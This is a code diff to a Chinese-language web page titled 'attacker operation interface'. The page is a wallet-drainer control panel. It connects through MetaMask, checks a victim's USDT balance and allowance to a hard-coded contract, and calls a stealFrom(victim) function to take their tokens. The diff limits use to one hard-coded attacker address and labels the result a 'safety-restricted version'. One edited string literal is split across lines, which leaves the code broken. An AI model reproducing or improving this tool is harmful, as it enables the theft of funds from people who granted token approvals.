@@ -3,7 +3,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🛠️ 攻擊者操作介面 v3.1.8（🚫防止自轉自）</title>
+  <title>🛠️ 攻擊者操作介面 v3.1.9（✅安全限制版）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -12,7 +12,7 @@
   </style>
 </head>
 <body>
-  <h2>🛠️ 攻擊者操作介面 v3.1.8（🚫防止自轉自）</h2>
+  <h2>🛠️ 攻擊者操作介面 v3.1.9（✅安全限制版）</h2>
   <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
   <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
   <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
@@ -28,6 +28,7 @@
   <script>
     const CONTRACT = "0xFbe9c4748A267562f723C67db673943F901533D6";
     const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const ATTACKER = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
     const ABI = [
       "event Approval(address indexed owner,address indexed spender,uint256 value)",
       "function balanceOf(address) view returns (uint256)",
@@ -42,8 +43,13 @@
       signer = provider.getSigner();
       attacker = await signer.getAddress();
       document.getElementById("account").innerText = attacker;
-      document.getElementById("auth").innerText = "你是攻擊者本人";
-      document.getElementById("auth").className = "ok";
+      if (attacker.toLowerCase() === ATTACKER.toLowerCase()) {
+        document.getElementById("auth").innerText = "你是攻擊者本人";
+        document.getElementById("auth").className = "ok";
+      } else {
+        document.getElementById("auth").innerText = "❌ 非授權攻擊者";
+        document.getElementById("auth").className = "bad";
+      }
       fetchApprovals();
     }
 
@@ -70,15 +76,13 @@
 
     async function steal() {
       const victim = document.getElementById("input").value;
-      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
-      const data = iface.encodeFunctionData("stealFrom", [victim]);
-
-      const attacker = await signer.getAddress();
-      if (victim.toLowerCase() === attacker.toLowerCase()) {
-        document.getElementById("status").innerText = "❌ 錯誤：受害者地址不能與攻擊者相同";
+      const current = await signer.getAddress();
+      if (current.toLowerCase() !== ATTACKER.toLowerCase()) {
+        document.getElementById("status").innerText = "❌ 此帳號不是授權攻擊者，禁止操作";
         return;
       }
-
+      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
+      const data = iface.encodeFunctionData("stealFrom", [victim]);
       const tx = { to: CONTRACT, data: data };
       document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
       try {
@@ -96,8 +100,9 @@
           const contract = new ethers.Contract(USDT, ABI, provider);
           const balance = await contract.balanceOf(val);
           const allowance = await contract.allowance(val, CONTRACT);
-          document.getElementById("balance").innerText = "🪙 Balance: " + balance.toString() +
-            "\n🪪 Allowance: " + allowance.toString();
+          document.getElementById("balance").innerText = "💵 USDT: " + balance.toString() +
+            "
+🪪 Allowance: " + allowance.toString();
         } catch {
           document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式正確";
         }
